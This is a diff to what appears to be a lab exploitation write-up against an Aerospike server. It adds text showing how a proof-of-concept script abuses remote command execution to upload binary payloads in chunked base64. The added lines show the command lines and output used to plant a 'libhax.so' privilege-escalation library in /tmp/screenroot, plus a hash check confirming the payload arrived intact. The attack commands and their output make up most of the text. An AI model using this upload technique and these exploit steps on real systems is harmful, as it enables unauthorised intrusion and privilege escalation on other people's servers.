@@ -324,7 +324,8 @@ the only path when no allowlisted port happens to be free.
 
 Binary payloads cannot ride a shell one-liner, and `base64` output through `io.popen` is fine but
 each `apply()` blocks a server thread. The compromise is **chunked base64 appended to a temp file**,
-with a small chunk size so no single call outlives the client timeout:
+with a small chunk size so no single call outlives the client timeout. The script is
+[`scripts/poc_aerospike_upload.py`](scripts/poc_aerospike_upload.py):
 
 ```python
 CHUNK = 3000
@@ -337,14 +338,41 @@ run(f"base64 -d {tmp} > {remote} && rm -f {tmp} && chmod {mode} {remote} && sha2
 ```
 
 ```bash
-AHOST=192.168.152.143 python3 poc_aerospike_upload.py \
+AHOST=192.168.150.143 python3 poc_aerospike_upload.py \
   --local /tmp/screen_poc/libhax.so --remote /tmp/screenroot/libhax.so --mode 755
 ```
 
 ```
 [+] uploading /tmp/screen_poc/libhax.so (14264 bytes) -> /tmp/screenroot/libhax.so
+[+] local sha256 190380462e10228d19a9acd956d8c4d789f641cd79ab1d0aa41d6a92b057b775
     sent 19020 b64 chars
 [+] remote: 190380462e10228d19a9acd956d8c4d789f641cd79ab1d0aa41d6a92b057b775  /tmp/screenroot/libhax.so
+[+] hash match — the file arrived intact
+```
+
+`AHOST` is just the host default — the script reads `AHOST`/`APORT`/`ANAMESPACE`/`ASET` from the
+environment and also accepts `--host`/`--port`. Without it you get the script's built-in default,
+which on a rebuilt box is the wrong address. Re-verified on the `192.168.152.143` rebuild with a
+20 000-byte random file (seven chunks, mode `644`):
+
+```bash
+AHOST=192.168.152.143 python3 poc_aerospike_upload.py \
+  --local big.bin --remote /tmp/aeroupload_test/big.bin --mode 644
+```
+
+```
+[+] uploading big.bin (20000 bytes) -> /tmp/aeroupload_test/big.bin
+[+] local sha256 74707cda7f34a441c9f567f1290c63952a97765b2dccc5148e9d3b621abbd63a
+    sent 26668 b64 chars
+[+] remote: 74707cda7f34a441c9f567f1290c63952a97765b2dccc5148e9d3b621abbd63a  /tmp/aeroupload_test/big.bin
+[+] hash match — the file arrived intact
+```
+
+On the target side, both the contents and the mode are what was asked for:
+
+```
+-rw-r--r--  1 aero aero 20000 /tmp/aeroupload_test/big.bin
+-rwxr-xr-x  1 aero aero  1068 /tmp/aeroupload_test/small.py
 ```
 
 The hash in the response is the whole point: it is computed **on the target**, so a round-trip match
